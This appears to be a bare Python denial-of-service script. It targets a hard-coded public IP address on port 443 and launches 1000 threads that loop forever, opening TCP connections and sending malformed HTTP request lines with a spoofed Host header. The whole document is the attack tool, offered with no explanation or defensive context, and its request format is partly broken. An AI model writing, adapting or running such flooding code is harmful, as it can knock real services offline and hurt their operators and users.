import socket
import threading

target_ip = '37.9.175.180' 
fake_ip = '192.168.1.1'
port = 443

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + " HTTPS/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
        s.close()

for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
